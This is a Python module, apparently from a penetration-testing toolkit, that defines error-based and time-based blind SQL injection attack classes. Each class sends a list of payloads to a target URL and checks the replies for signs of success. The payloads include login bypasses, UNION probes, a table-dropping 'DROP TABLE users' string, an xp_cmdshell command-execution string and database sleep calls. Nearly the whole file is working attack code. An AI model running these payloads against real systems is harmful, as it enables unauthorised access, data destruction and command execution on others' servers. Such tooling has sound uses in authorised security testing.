import requests
from .attack_base import AttackBase
from ..utils.logger import setup_logger

logger = setup_logger('sql_injection')

class SQLInjectionAttack(AttackBase):
    """SQL Injection Attack"""
    
    def __init__(self):
        super().__init__(
            name="SQL Injection",
            description="SQL injection vulnerability exploitation"
        )
        
        # Common SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('dir')--"
        ]
    
    def execute(self, url, parameter='username', method='POST'):
        """Execute SQL injection attack"""
        logger.info(f"Starting SQL injection on {url}")
        
        results = {
            'vulnerable': False,
            'successful_payloads': [],
            'responses': []
        }
        
        for payload in self.payloads:
            try:
                logger.debug(f"Testing payload: {payload}")
                
                if method.upper() == 'POST':
                    data = {parameter: payload, 'password': 'test'}
                    response = requests.post(url, data=data, timeout=5)
                else:
                    params = {parameter: payload}
                    response = requests.get(url, params=params, timeout=5)
                
                # Check for signs of successful injection
                if self._check_vulnerability(response):
                    results['vulnerable'] = True
                    results['successful_payloads'].append(payload)
                    logger.warning(f"Vulnerable to payload: {payload}")
                
                results['responses'].append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'length': len(response.text)
                })
                
            except Exception as e:
                logger.error(f"Request error: {e}")
        
        logger.info(f"SQL injection completed: {len(results['successful_payloads'])} successful")
        return results
    
    def _check_vulnerability(self, response):
        """Check if response indicates vulnerability"""
        indicators = [
            'sql syntax',
            'mysql_fetch',
            'syntax error',
            'unclosed quotation',
            'odbc',
            'jdbc',
            'sqlserver',
            'oracle',
            'postgresql'
        ]
        
        response_lower = response.text.lower()
        
        for indicator in indicators:
            if indicator in response_lower:
                return True
        
        # Check for unusual status codes or response sizes
        if response.status_code == 500:
            return True
        
        return False

class BlindSQLInjection(AttackBase):
    """Blind SQL Injection Attack"""
    
    def __init__(self):
        super().__init__(
            name="Blind SQL Injection",
            description="Time-based blind SQL injection"
        )
    
    def execute(self, url, parameter='id', delay=5):
        """Execute blind SQL injection with time delay"""
        logger.info(f"Starting blind SQL injection on {url}")
        
        # Time-based payloads
        payloads = [
            f"1' AND SLEEP({delay})--",
            f"1' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
            f"1'; WAITFOR DELAY '00:00:{delay:02d}'--",
            f"1' AND pg_sleep({delay})--"
        ]
        
        results = {'vulnerable': False, 'successful_payloads': []}
        
        for payload in payloads:
            try:
                import time
                start_time = time.time()
                
                response = requests.get(
                    url,
                    params={parameter: payload},
                    timeout=delay + 5
                )
                
                elapsed = time.time() - start_time
                
                # If response took significantly longer, likely vulnerable
                if elapsed > delay - 1:
                    results['vulnerable'] = True
                    results['successful_payloads'].append(payload)
                    logger.warning(f"Time-based injection successful: {payload}")
                
            except Exception as e:
                logger.error(f"Blind SQL injection error: {e}")
        
        return results
